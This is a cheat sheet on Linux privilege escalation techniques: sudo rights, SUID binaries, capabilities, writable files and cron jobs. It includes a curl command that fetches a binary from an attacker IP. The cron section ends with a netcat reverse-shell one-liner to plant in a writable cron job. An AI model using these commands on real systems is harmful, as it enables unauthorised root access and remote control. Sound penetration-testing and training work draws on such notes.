# Linux PrivEsc

The resources you will mostly be relying on are mainly [GTFOBins](https://gtfobins.github.io/) and [HackTricks](https://book.hacktricks.wiki/en/index.html)
## Sudo Permissions
### sudo -l

Listing the current user's list of allowed binaries that can be run with sudo can sometimes net an easy win. Imagine if you have sudo capabilities for `su`, just run `sudo su` and poof, you're suddenly root. 
A comprehensive list of abusable binaries can be found on [GTFOBins](https://gtfobins.github.io/)

To check for sudo permissions (requires password)
```bash
sudo -l
```

If the user can run ANY command with sudo, you can just use
```bash
sudo -i
```
### SUID bit

If an SUID bit is set on a binary, it allows anyone on the machine to run said binary with sudo permissions that can be abused to grant privilege escalation

Full list of abusable SUID binaries at [GTFOBins](https://gtfobins.github.io/)

To check for binaries that have SUID set
```bash
find / -perm -u=s -type f 2>/dev/null
```

## Capabilities

Capabilities are attributes that provide specific privileges that are usually only executable with root-level access/permissions. An example of this would be to intercept network traffic, mount/unmount devices or simply read a file with root permissions without granting root-level write capabilities.

If misconfigured, this can provide the attacker with a means of privilege escalation. As usual, a comprehensive list of binaries that can be abused via capabilities can be found on [GTFOBins](https://gtfobins.github.io/)

Check for abusable capabilities using getcap
```bash
/usr/sbin/getcap -r / 2>/dev/null
```

If the system has no getcap, you can drop one yourself
```bash
curl http://192.168.100.200/getcap > getcap
chmod +x getcap
getcap -r / 2>/dev/null
```

## Writable Files and Directories

Certain files and directories can provide ways to privilege escalate with write permissions. This can be as straightforward as adding a user into `/etc/passwd`. 

The results may also hint at folders or files that are being executed or are dependent on another process or cronjob, which can then be overwritten to obtain privilege escalation.

The command to check for writable files and directories on the system is
```bash
# Directories
find / -writable -type d 2>/dev/null

# Files
find / -writable -type f 2>/dev/null
```

## Crontabs/Cronjobs

Cron jobs, if any, tend to run with privileged permissions in order to properly execute a certain task. These tasks can be leveraged to spawn a shell as a privileged user by an attacker, thereby granting privilege escalation.

Crontabs for the current user can be checked via
```bash
crontab -l
```

If you have sudo permissions, you can also run `sudo crontab -l` to view more cronjobs (if available)

System-wide crontabs can, from time be viewed from `/etc/crontab` if an admin adds it there
```bash
cat /etc/crontab
```

Cronjobs can also be found in the `cron` folders
```bash
ls -lah /etc/cron*
```

If you find that you are able to edit a cron job file, adding this simple line at the end will establish a reverse shell back to your Kali machine (remember to change the IP address and port number if necessary)
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.100.200 4444 >/tmp/f
```

